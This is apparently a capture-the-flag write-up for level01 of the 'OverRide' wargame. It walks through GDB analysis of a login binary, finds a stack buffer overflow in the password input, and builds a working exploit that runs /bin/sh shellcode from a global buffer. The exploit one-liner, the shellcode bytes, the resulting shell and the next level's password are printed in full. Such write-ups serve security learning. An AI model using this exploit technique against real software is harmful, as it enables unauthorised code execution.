# Level01

At this level (level01) also i found a binary file whan run it he want username and  password  

```nasm
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username:
verifying username....

Enter Password:
nope, incorrect password...

level01@OverRide:~$
```

## **Binary Analysis**

After examining the program with GDB, I found the username and password:

```nasm
(gdb) disas 0x8048464
[...]
   0x08048478 <+20>:	mov    $0x804a040,%edx
   0x0804847d <+25>:	mov    $0x80486a8,%eax
[...]
(gdb) x/s 0x80486a8
0x80486a8:	 "dat_wil"
(gdb)
```

The username is `dat_wil` 

```nasm
(gdb) disas 0x80484a3
[...]
   0x080484ad <+10>:	mov    $0x80486b0,%eax
[...]
End of assembler dump.
(gdb) x/s 0x80486b0
0x80486b0:	 "admin"
(gdb)
```

The password is `admin`, but it is not working. Now, we try another approach.

```nasm
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
admin
nope, incorrect password...

level01@OverRide:~$
```

The program primarily takes a username as input. The `main` function calls `verify_user_name`, which compares the first **7 bytes** of the provided username with a hardcoded string `"dat_wil"`.

```nasm
0x08048464 <+0>:     push   %ebp
0x08048478 <+20>:    mov    $0x804a040,%edx    # Username buffer
0x0804847d <+25>:    mov    $0x80486a8,%eax    # "dat_wil"
0x08048482 <+30>:    mov    $0x7,%ecx          # Compare 7 bytes
0x0804848b <+39>:    repz cmpsb %es:(%edi),%ds:(%esi)
```

If the username check succeeds, the program proceeds to verify the password. The `main` function calls `verify_user_pass`, which compares **5 bytes** of the input password with another hardcoded value.

```nasm
0x080484a3 <+0>:     push   %ebp
0x080484ad <+10>:    mov    $0x80486b0,%eax    # Password comparison
0x080484b2 <+15>:    mov    $0x5,%ecx          # Compare 5 bytes
0x080484bb <+24>:    repz cmpsb %es:(%edi),%ds:(%esi)
```

than the function returns to `main`, which then prints  "nope, incorrect password...\n”

```nasm
gdb) disas main
...
   0x080484d8 <+8>:	sub    $0x60,%esp ;Allocates 96 bytes for stack frame
...
   0x08048519 <+73>:	movl   $0x100,0x4(%esp) ;Size parameter for fgets 256 bytes
   0x08048521 <+81>:	movl   $0x804a040,(%esp)
   0x08048528 <+88>:	call   0x8048370 <fgets@plt>
   0x0804852d <+93>:	call   0x8048464 <verify_user_name>
 ...
   0x08048565 <+149>:	movl   $0x64,0x4(%esp); Size parameter for fgets 100 bytes
   0x0804856d <+157>:	lea    0x1c(%esp),%eax
   0x08048571 <+161>:	mov    %eax,(%esp)
   0x08048574 <+164>:	call   0x8048370 <fgets@plt>
   0x08048579 <+169>:	lea    0x1c(%esp),%eax
   0x0804857d <+173>:	mov    %eax,(%esp)
   0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
  ...
   0x08048597 <+199>:	movl   $0x804871e,(%esp) ; nope, incorrect password...\n
...
End of assembler dump.
(gdb) x/s 0x804871e
0x804871e:	 "nope, incorrect password...\n"
(gdb)
```

## **Vulnerability**

Buffer Overflow in Password Input:

```nasm
; Stack frame allocation
20x080484d8 <+8>:     sub    $0x60,%esp         ; Allocates 96 bytes (0x60)
;fgets call for password
50x08048565 <+149>:   movl   $0x64,0x4(%esp)    ; Reads 100 bytes (0x64)
60x08048574 <+164>:   call   0x8048370 <fgets@plt>
```

The vulnerability exists because:

- Stack frame allocates 96 bytes (0x60)
- Program tries to read 100 bytes (0x64)
- This 4-byte difference allows buffer overflow

## **Exploit**

Now, we find the offset by trying to generate input multiple times to overflow the second input.

```python
(python -c 'print "dat_wil\n" + "A"*80 + "BBBB"'; cat) | ./level01
```

The offset to EIP is 80 bytes. Now, we find the start address of our shellcode in the first input.

```python
(gdb) info variables
...
0x0804a040  a_user_name    # This is our target buffer
```

We find the start address of the global buffer and have 7 characters of the username `dat_wil`. The shellcode start is `0x0804a040 + 7 = 0x0804a047`.

```python
username = "dat_wil" + shellcode + "\n"
password = "A"*80 + "\x47\xa0\x04\x08"  # 0x0804a047 points to shellcode
```

Final exploit:

```nasm
 (python -c 'print "dat_wil" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\n" + "A"* 80 + "\x47\xa0\x04\x08"'; cat) | ./level01
```

Memory Layout

```python
Global buffer (0x0804a040):
[dat_wil][shellcode]
   7b      21b
    |         |
    |         +-> 0x0804a047 (shellcode start)
    +-> 0x0804a040 (buffer start)

Stack:
[80 'A's][Return Address]
```

the resulte :

```python
level01@OverRide:~$ (python -c 'print "dat_wil" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\n" + "A"*80 + "\x47\xa0\x04\x08"'; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv

```

## Flag

```python
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```